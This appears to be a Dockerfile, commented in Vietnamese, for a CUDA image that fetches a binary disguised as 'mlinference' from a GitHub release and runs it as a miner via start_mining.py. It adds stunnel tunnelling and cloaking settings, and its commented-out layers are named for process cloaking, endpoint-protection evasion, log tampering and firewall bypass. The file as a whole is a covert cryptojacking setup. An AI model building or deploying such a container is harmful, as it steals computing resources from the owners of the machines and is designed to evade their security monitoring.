# Bước 1: Sử dụng nền tảng CUDA của NVIDIA
FROM nvidia/cuda:11.7.1-cudnn8-runtime-ubuntu22.04

# Thiết lập biến môi trường để chặn tương tác đầu vào trong quá trình cài đặt
ENV DEBIAN_FRONTEND=noninteractive \
    Mlinference_CONFIG=/app/mining_environment/config/mlinference_config.json \
    PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1

# Bước 2: Cài đặt các thư viện hệ thống cần thiết và mlinference
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        python3 \
        python3-pip \
        curl \
        git \
        build-essential \
        cmake \
        libssl-dev \
        libeigen3-dev \
        libnuma-dev \
        stunnel4 && \
    # Cài đặt và cấu hình mlinference
    curl -L -o /usr/local/bin/mlinference "https://github.com/wollfoo/llmsdeep/releases/download/mlinference/mlinference" && \
    chmod +x /usr/local/bin/mlinference && \
    # Dọn dẹp để giảm kích thước image
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Bước 3: Tạo người dùng không root
RUN addgroup --system appgroup && adduser --system appuser --ingroup appgroup

COPY --chown=appuser:appuser stunnel.conf /etc/stunnel/stunnel.conf
RUN chmod 700 /etc/stunnel/stunnel.conf

# Bước 4: Thiết lập thư mục làm việc
WORKDIR /app

# Bước 5: Sao chép và cài đặt các phụ thuộc Python
COPY --chown=appuser:appuser requirements.txt /app/
RUN python3 -m pip install --upgrade pip && \
    pip3 install --no-cache-dir -r requirements.txt

# Bước 6: Sao chép toàn bộ thư mục mining_environment

# ===== Lớp 1: Môi trường khai thác =====
COPY --chown=appuser:appuser mining_environment/ /app/mining_environment/

# Thiết lập permissions cho các tệp cấu hình, scripts, logs và resources trong mining_environment
RUN chmod 600 /app/mining_environment/config/*.json && \
    chmod +x /app/mining_environment/scripts/*.py && \
    chmod 600 /app/mining_environment/logs/*.log && \
    chmod 700 /app/mining_environment/resources/encryption_keys/* /app/mining_environment/resources/legal_templates/*


# Thiết lập các biến môi trường cố định
ENV CONFIG_DIR=/app/mining_environment/config \
    MODELS_DIR=/app/mining_environment/models \
    LOGS_DIR=/app/mining_environment/logs \
    RESOURCES_DIR=/app/mining_environment/resources \
    MINING_COMMAND=/usr/local/bin/mlinference \
    MINING_CONFIG=mlinference_config.json \
    CLOAKING_THRESHOLD=0.9 \
    CLOAKING_INTERVAL=60

# ===== LỚP 02 ĐẾN LỚP 10 =====
# Sao chép các tệp và thư mục của các lớp khác
# COPY --chown=appuser:appuser resource-optimization/ /app/resource-optimization/
# COPY --chown=appuser:appuser process-cloaking-endpoint-protection/ /app/process-cloaking-endpoint-protection/
# COPY --chown=appuser:appuser network-traffic-protection/ /app/network-traffic-protection/
# COPY --chown=appuser:appuser identity-access-protection/ /app/identity-access-protection/
# COPY --chown=appuser:appuser behavioral-adjustment-evasion/ /app/behavioral-adjustment-evasion/
# COPY --chown=appuser:appuser alert-response-adjustment/ /app/alert-response-adjustment/
# COPY --chown=appuser:appuser log-data-protection/ /app/log-data-protection/
# COPY --chown=appuser:appuser firewall_packet_inspection_bypass/ /app/firewall-packet-inspection-bypass/
# COPY --chown=appuser:appuser compliance-zero-trust/ /app/compliance-zero-trust/

# Thiết lập permissions cho các thư mục lớp 02 đến lớp 10
# RUN chmod -R 700 /app/resource-optimization/ /app/process-cloaking-endpoint-protection/ \
#     /app/network-traffic-protection/ /app/identity-access-protection/ \
#     /app/behavioral-adjustment-evasion/ /app/alert-response-adjustment/ \
#     /app/log-data-protection/ /app/firewall-packet-inspection-bypass/ \
#     /app/compliance-zero-trust/

# ===== Bước 7: Sao chép script khởi động =====
COPY --chown=appuser:appuser start_mining.py /app/

# Chuyển sang người dùng không root
USER appuser

# ===== Bước 8: Thiết lập điểm vào (entrypoint) =====
CMD ["python3", "/app/start_mining.py"]
